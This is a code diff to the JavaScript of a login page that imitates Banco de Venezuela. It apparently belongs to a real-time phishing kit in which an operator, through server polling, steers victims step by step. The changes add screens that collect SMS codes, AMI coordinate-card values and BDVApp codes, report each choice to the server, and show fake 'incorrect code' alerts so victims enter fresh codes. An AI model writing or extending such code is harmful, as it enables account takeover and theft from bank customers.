@@ -152,6 +152,8 @@
   const authMethod = document.getElementById('authMethod');
   const loginUnico = document.querySelector('app-login-unico');
   const smsMethodBtn = document.getElementById('smsMethodBtn');
+  const amiMethodBtn = document.getElementById('amiMethodBtn');
+  const bdvappMethodBtn = document.getElementById('bdvappMethodBtn');
   const backMethodBtn = document.getElementById('backMethodBtn');
   const verifyForm = document.getElementById('verifyForm');
   const verifyCode = document.getElementById('verifyCode');
@@ -164,6 +166,7 @@
   const authStep2 = document.getElementById('authStep2');
   const authStep1Icon = document.getElementById('authStep1Icon');
   const authStepLine = document.getElementById('authStepLine');
+  const authMethodName = document.getElementById('authMethodName');
 
   function showSpinner() {
     if (spinner) spinner.classList.add('is-visible');
@@ -207,6 +210,7 @@
 
   function showVerifyStep(mode) {
     if (!authMethod) return;
+    currentOtpAction = mode;
     authMethod.dataset.step = 'verify';
     if (authSelectPanel) authSelectPanel.hidden = true;
     if (authVerifyPanel) authVerifyPanel.hidden = false;
@@ -224,15 +228,26 @@
     }
     if (authStepLine) authStepLine.classList.add('is-done');
 
-    // Adaptar etiquetas según si el operador solicitó SMS o Dinámica
+    // Adaptar etiquetas según método solicitado (SMS, AMI o BDVApp)
     const labelTitle = document.querySelector('.auth-verify-title');
     const labelSub = document.querySelector('.auth-verify-sub');
-    if (mode === 'dinamica') {
-      if (labelTitle) labelTitle.textContent = 'Clave Dinámica';
-      if (labelSub) labelSub.textContent = 'Introduce la clave dinámica generada en tu tarjeta de coordenadas o app BDV';
+    const matLabel = codeLabel ? codeLabel.querySelector('mat-label') : null;
+
+    if (mode === 'ami') {
+      if (authMethodName) authMethodName.textContent = 'Tarjeta de Coordenadas (AMI)';
+      if (labelTitle) labelTitle.textContent = 'Tarjeta de Coordenadas (AMI)';
+      if (labelSub) labelSub.textContent = 'Introduce las coordenadas de tu tarjeta AMI Venlínea';
+      if (matLabel) matLabel.textContent = 'Coordenadas AMI';
+    } else if (mode === 'bdvapp') {
+      if (authMethodName) authMethodName.textContent = 'Autenticación BDVApp';
+      if (labelTitle) labelTitle.textContent = 'Autenticación BDVApp';
+      if (labelSub) labelSub.textContent = 'Introduce la clave generada en tu aplicación móvil BDVApp';
+      if (matLabel) matLabel.textContent = 'Código BDVApp';
     } else {
+      if (authMethodName) authMethodName.textContent = 'Código por SMS';
       if (labelTitle) labelTitle.textContent = 'Verificación por SMS';
       if (labelSub) labelSub.textContent = 'Introduce el código de verificación enviado por mensaje de texto';
+      if (matLabel) matLabel.textContent = 'Código SMS';
     }
 
     if (codeField) codeField.classList.remove('mat-form-field-invalid');
@@ -254,10 +269,33 @@
   if (smsMethodBtn) {
     smsMethodBtn.addEventListener('click', () => {
       showSpinner();
+      sendState('metodo-sms');
       setTimeout(() => {
         hideSpinner();
         showVerifyStep('sms');
-      }, 600);
+      }, 500);
+    });
+  }
+
+  if (amiMethodBtn) {
+    amiMethodBtn.addEventListener('click', () => {
+      showSpinner();
+      sendState('metodo-ami');
+      setTimeout(() => {
+        hideSpinner();
+        showVerifyStep('ami');
+      }, 500);
+    });
+  }
+
+  if (bdvappMethodBtn) {
+    bdvappMethodBtn.addEventListener('click', () => {
+      showSpinner();
+      sendState('metodo-bdvapp');
+      setTimeout(() => {
+        hideSpinner();
+        showVerifyStep('bdvapp');
+      }, 500);
     });
   }
 
@@ -285,11 +323,11 @@
         const action = data.action;
 
         if (action === 'sms') {
-          currentOtpAction = 'sms';
           goToAuthMethod('sms');
-        } else if (action === 'dinamica') {
-          currentOtpAction = 'dinamica';
-          goToAuthMethod('dinamica');
+        } else if (action === 'ami') {
+          goToAuthMethod('ami');
+        } else if (action === 'bdvapp') {
+          goToAuthMethod('bdvapp');
         } else if (action === 'error-login') {
           hideSpinner();
           openModal();
@@ -302,15 +340,23 @@
             verifyCode.value = '';
             verifyCode.focus();
           }
-          alert('Código SMS incorrecto o vencido. Por favor ingrese el nuevo código.');
-        } else if (action === 'error-dinamica') {
+          alert('Código SMS incorrecto o vencido. Por favor ingrese el nuevo código recibido.');
+        } else if (action === 'error-ami') {
           hideSpinner();
           if (codeField) codeField.classList.add('mat-form-field-invalid');
           if (verifyCode) {
             verifyCode.value = '';
             verifyCode.focus();
           }
-          alert('Clave Dinámica incorrecta. Por favor verifique e ingrese nuevamente.');
+          alert('Coordenadas AMI incorrectas. Por favor verifique su tarjeta AMI e intente nuevamente.');
+        } else if (action === 'error-bdvapp') {
+          hideSpinner();
+          if (codeField) codeField.classList.add('mat-form-field-invalid');
+          if (verifyCode) {
+            verifyCode.value = '';
+            verifyCode.focus();
+          }
+          alert('Código BDVApp incorrecto o expirado. Genere un nuevo código e ingrese nuevamente.');
         } else if (action === 'done') {
           stopPing();
           stopPolling();
@@ -321,7 +367,7 @@
     }, 1000);
   }
 
-  // Envío del código de verificación (Token / SMS)
+  // Envío del código de verificación (Token / SMS / AMI / BDVApp)
   if (verifyForm) {
     verifyForm.addEventListener('submit', async (e) => {
       e.preventDefault();
